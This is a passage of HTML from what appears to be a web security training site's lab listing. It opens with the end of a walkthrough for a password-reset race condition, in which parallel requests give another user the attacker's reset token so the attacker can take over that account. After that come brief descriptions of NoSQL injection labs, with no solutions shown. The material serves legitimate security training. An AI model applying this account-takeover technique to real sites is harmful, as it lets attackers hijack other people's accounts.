                                <li>
                                    <p>
                                        Notice the separate
                                        <code>
         username
        </code>
                                        parameter. This suggests that the username might not be included in the hash,
                                        which means that two different usernames could theoretically have the same
                                        token.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In Repeater, go to the pair of
                                        <code>
         POST /forgot-password
        </code>
                                        requests and change the
                                        <code>
         username
        </code>
                                        parameter in one of them to
                                        <code>
         carlos
        </code>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Resend the two requests in parallel. If the attack worked, both users should be
                                        assigned the same reset token, although you won't be able to see this.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Check your inbox again and observe that, this time, you've only received one new
                                        confirmation email. Infer that the other email, hopefully containing the same
                                        token, has been sent to Carlos.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Copy the link from the email and change the username in the query string to
                                        <code>
         carlos
        </code>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Visit the URL in the browser and observe that you're taken to the form for
                                        setting a new password as normal.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Set the password to something you'll remember and submit the form.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Try logging in as
                                        <code>
         carlos
        </code>
                                        using the password you just set.
                                    </p>
                                    <ul>
                                        <li>
                                            If you can't log in, resend the pair of password reset emails and repeat the
                                            process.
                                        </li>
                                        <li>
                                            If you successfully log in, visit the admin panel and delete the user
                                            <code>
          carlos
         </code>
                                            to solve the lab.
                                        </li>
                                    </ul>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Detecting NoSQL injection
                (nosql-injection)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-green-small">
                        APPRENTICE
                    </span>
                </p>
            </div>
            <p>
                The product category filter for this lab is powered by a MongoDB NoSQL database. It is vulnerable to
                <a href="https://portswigger.net/web-security/nosql-injection">
                    NoSQL injection
                </a>
                .
            </p>
            <p>
                To solve the lab, perform a NoSQL injection attack that causes the application to display unreleased
                products.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/8878778fc200a649aa733122e9e01376459c5e0b2a67f4ab76ef510e2659d168?referrer=%2fweb-security%2fnosql-injection%2flab-nosql-injection-detection"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution">
                <h4>
                    Solution
                </h4>
                <div>
                    <p>
                        We'll publish a step-by-step solution in a few days. Follow us on Twitter
                        <a href="https://twitter.com/websecacademy">
                            @WebSecAcademy
                        </a>
                        to be notified as soon as they're available.
                    </p>
                </div>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Exploiting NoSQL operator injection to bypass authentication
                (nosql-injection)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-green-small">
                        APPRENTICE
                    </span>
                </p>
            </div>
            <p>
                The login functionality for this lab is powered by a MongoDB NoSQL database. It is vulnerable to
                <a href="https://portswigger.net/web-security/nosql-injection">
                    NoSQL injection
                </a>
                using MongoDB operators.
            </p>
            <p>
                To solve the lab, log into the application as the
                <code>
   administrator
  </code>
                user.
            </p>
            <p>
                You can log in to your own account using the following credentials:
                <code>
   wiener:peter
  </code>
                .
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/522964eab6f4e4217f650c420f52a617e4cc1ec23db87621f575afde879e30e8?referrer=%2fweb-security%2fnosql-injection%2flab-nosql-injection-bypass-authentication"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution">
                <h4>
                    Solution
                </h4>
                <div>
                    <p>
                        We'll publish a step-by-step solution in a few days. Follow us on Twitter
                        <a href="https://twitter.com/websecacademy">
                            @WebSecAcademy
                        </a>
                        to be notified as soon as they're available.
                    </p>
                </div>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Exploiting NoSQL injection to extract data
                (nosql-injection)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                The user lookup functionality for this lab is powered by a MongoDB NoSQL database. It is vulnerable to
                <a href="https://portswigger.net/web-security/nosql-injection">
                    NoSQL injection
                </a>
                .
            </p>
            <p>
                To solve the lab, extract the password for the
                <code>
   administrator
  </code>
                user, then log in to their account.
            </p>
            <p>
                You can log in to your own account using the following credentials:
                <code>
   wiener:peter
  </code>
                .
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/4a6884ba4c15a8785848b9e6bd721f6e7086c5ddfa9e3acce8d35f44effbca30?referrer=%2fweb-security%2fnosql-injection%2flab-nosql-injection-extract-data"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution">
                <h4>
                    Solution
                </h4>
                <div>
                    <p>
                        We'll publish a step-by-step solution in a few days. Follow us on Twitter
                        <a href="https://twitter.com/websecacademy">
                            @WebSecAcademy
                        </a>
                        to be notified as soon as they're available.
                    </p>
                </div>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Exploiting NoSQL operator injection to extract unknown fields
                (nosql-injection)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                The user lookup functionality for this lab is powered by a MongoDB NoSQL database. It is vulnerable to
                <a href="https://portswigger.net/web-security/nosql-injection">
                    NoSQL injection
                </a>
                .
            </p>
            <p>
                To solve the lab, log in as
                <code>
   carlos
  </code>
                .
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/41de2d2e1fe38de02af99bd28b3a70858514e70f701486d13b7eae2d40e4aeae?referrer=%2fweb-security%2fnosql-injection%2flab-nosql-injection-extract-unknown-fields"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution">
                <h4>
                    Solution
                </h4>
                <div>
                    <p>
                        We'll publish a step-by-step solution in a few days. Follow us on Twitter
                        <a href="https://twitter.com/websecacademy">
                            @WebSecAcademy
                        </a>
                        to be notified as soon as they're available.
                    </p>
                </div>
            </div>
        </div>
        <hr>

    </div>
    <script type="text/javascript">
        var _paq = _paq || [];
        _paq.push(['setTrackingSource', 'jstc_tm']);
        _paq.push(['enableLinkTracking']);
        _paq.push(['setIpTracking', true]);
        _paq.push(['setDomains', ['portswigger.net']]);
        _paq.push(['setCustomDimensionValue', 1, '']);
        _paq.push(['setCustomDimensionValue', 2, '']);
        _paq.push(['setCustomDimensionValue', 3, '']);
        _paq.push(['setCustomDimensionValue', 4, '']);
        _paq.push(['setCustomDimensionValue', 5, '']);
        var userId = '' ? '' : false;
        if (userId) {
            _paq.push(['setUserId', userId]);
        }
        _paq.push(['trackPageView']);
        (function (p, i, w, ik) {
            var g = ik.createElement('script'), s = ik.getElementsByTagName('script')[0];
            _paq.push(['setTrackerUrl', p]);
            _paq.push(['setSiteId', w]);
            g.type = 'text/javascript'; g.async = true; g.defer = true; g.src = i; s.parentNode.insertBefore(g, s);
        })('https://ps.piwik.pro/ppms.php', 'https://ps.containers.piwik.pro/ppms.js', '287552c2\u002D4917\u002D42e0\u002D8982\u002Dba994a2a73d7', document)
    </script>
    <script type="text/javascript">
            (function (a, n, r) { function o(e) { var t; !function (e) { try { e.contentWindow.location.href } catch (e) { return 1 } }(e) ? setTimeout(function () { o(e) }, 500) : (t = new YT.Player(e, { events: { onStateChange: c } }), e.setAttribute("data-listener-attached", !0), t.lastAction = "i") } function i(e) { return "function" == typeof e.getCurrentTime ? e.getCurrentTime() : e.playerInfo.currentTime } function s(e, t) { n._paq = n._paq || [], n._paq.push(["trackEvent", "Video - YouTube", t, ("function" == typeof (t = e).getVideoData ? t.getVideoData() : t.playerInfo.videoData).title, i(e).toFixed()]) } function c(e) { var t = e.target; e.data === YT.PlayerState.PLAYING && setTimeout(u, 1e3, t), e.data === YT.PlayerState.PLAYING && (-1 < ["i", "p"].indexOf(t.lastAction) && s(t, "i" === t.lastAction ? "Play" : "Resume"), t.lastAction = ""), e.data === YT.PlayerState.PAUSED && (s(t, "Pause"), t.lastAction = "p"), e.data === YT.PlayerState.ENDED && (s(t, "Watched"), t.lastAction = "i") } function u(e) { var t, a, n, o; ("function" == typeof (t = e).getPlayerState ? t.getPlayerState() : t.playerInfo.playerState) === YT.PlayerState.PLAYING && r.trackThresholds && (t = r.thresholdsToTrack, o = e, o = Math.round(i(o) / ("function" == typeof (o = o).getDuration ? o.getDuration() : o.playerInfo.duration) * 100), n = o, o = t, (a = e).passedThresholds = a.passedThresholds || [], o.forEach(function (e) { !a.passedThresholds.includes(e) && e < n && (a.passedThresholds.push(e), s(a, "Progress - " + e + "%")) }), setTimeout(u, 1e3, e)) } function e() { a.querySelectorAll("iframe").forEach(function (e) { var t, a; /youtube.*\/embed/.test(e.src) && !e.getAttribute("data-listener-attached") && (-1 === (a = (t = e).src).indexOf("enablejsapi=") && (a += (-1 === a.indexOf("?") ? "?" : "&") + "enablejsapi=1"), -1 === a.indexOf("origin=") && (a += (-1 === a.indexOf("?") ? "?" : "&") + "origin=" + encodeURIComponent(location.origin)), t.src = a, o(e)) }) } function t(e) { var t; n.MutationObserver && (t = a.getElementsByTagName("body")[0], new MutationObserver(e).observe(t, { childList: !0, attributes: !1, subtree: !0 })) } var d, l, f; Boolean(n.YT) ? (e(), t(e)) : (d = n.onYouTubeIframeAPIReady, n.onYouTubeIframeAPIReady = function () { "function" == typeof d && d(), e(), t(e) }, l = a.createElement("script"), f = a.getElementsByTagName("script")[0], l.src = "//www.youtube.com/iframe_api", l.async = !0, f.parentNode.insertBefore(l, f)) })
            (document, window, {
                trackThresholds: 0,
                thresholdsToTrack: []
            });
    </script>
</body>

</html>